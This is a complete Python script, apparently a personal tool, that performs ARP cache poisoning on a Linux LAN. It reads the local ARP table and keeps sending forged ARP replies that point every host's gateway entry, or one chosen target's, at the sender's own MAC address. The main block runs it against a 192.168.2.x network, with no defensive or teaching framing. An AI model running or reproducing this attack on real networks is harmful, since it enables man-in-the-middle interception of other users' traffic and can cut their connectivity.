#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#only supported in linux


__author__ = 'xilei'

import re
import subprocess
import socket
import time
from struct import pack, unpack, calcsize

try:
    from io import StringIO
except ImportError:
    from StringIO import StringIO


ARPOP_REQUEST = pack('!H', 0x0001)
ARPOP_REPLY = pack('!H', 0x0002)
BCAST_MAC =  pack('!6B', *(0xFF,)*6)

def arppacket(target_ip,target_mac,sender_ip,sender_mac,arp_type=ARPOP_REQUEST):
    #sender_mac =  pack('!6B', *(0xC0, 0xD9, 0x62, 0x1F, 0x2F, 0x9C))
    #target_mac = pack('!6B', *(0xC0, 0xD9, 0x62, 0x1F, 0x2F, 0x9C))
    sender_ip = pack('!4B', *[int(x) for x in sender_ip.split('.')])
    target_ip = pack('!4B', *[int(x) for x in target_ip.split('.')])
    
    #@see https://github.com/krig/send_arp.py/blob/master/send_arp.py
    arpframe = [
        ### ETHERNET
        # destination MAC addr
        target_mac,
        # source MAC addr
        sender_mac,
        # protocol type (=ARP)
        pack('!H', 0x0806),

        ### ARP
        # logical protocol type (Ethernet/IP)
        pack('!HHBB', 0x0001, 0x0800, 0x0006, 0x0004),
        # operation type
        arp_type,
        # sender MAC addr
        sender_mac,
        # sender IP addr
        sender_ip,
        # target hardware addr
        target_mac,
        # target IP addr
        target_ip
    ]
    return b''.join(arpframe)

def pack_mac(mac_str):
    return pack('!6B',*(int(x,16) for x in mac_str.split(':') ))

def hosts_map(device='eth0',exclude=None):
    output = subprocess.check_output(['arp','-n'])
    r = StringIO(output.decode('utf-8'))
    reb = re.compile('\s+')
    res = set()
    for line in r.readlines():
        item = reb.split(line.strip())
        if(len(item)<5):
            continue
        if(item[4] != device or item[0] in exclude):
            continue
        res.add((item[0],item[2]))
    r.close()
    return res

#the raw l2 socket
def create_l2sock(device):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x806))
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
    sock.bind((device, 0x806))
    return sock
    
#send by nmap -sn,arp -n
def send_all(gateway='192.168.1.1',device='eth0',exclude=None,arp_type=ARPOP_REPLY):
    hosts = hosts_map(device,exclude) 
    packets = set()
    sock = create_l2sock(device)
    for ip,mac in hosts:
        if ip == gateway:
            continue
        packets.add(arppacket(
                target_ip=ip,
                target_mac= pack_mac(mac),
                sender_ip=gateway,
                sender_mac= sock.getsockname()[4],
                arp_type=arp_type
        ))
    try:
        while True:
            for packet in packets:
                sock.send(packet)
            time.sleep(1)  
    except KeyboardInterrupt :
        print('exit.')
    except Exception as e:
        raise e
    finally:
        sock.close()

#send one
def send_one(target_ip,target_mac,gateway='192.168.1.1',arp_type=ARPOP_REPLY,device='eth0'):
    sock = create_l2sock(device)
    packet = arppacket(
            target_ip=target_ip,
            target_mac= pack_mac(target_mac),
            sender_ip=gateway,
            sender_mac= sock.getsockname()[4],
            arp_type=arp_type
    )
    try:
        while True:
            sock.send(packet)
            time.sleep(1)  
    except KeyboardInterrupt :
        print('exit.')
    except Exception as e:
        raise e
    finally:
        sock.close()

        
if __name__ == '__main__':
    send_all(
        '192.168.2.1',
        device='eth0',
        exclude=('192.168.2.125','192.168.2.108','192.168.2.101'),
        arp_type=ARPOP_REPLY
        )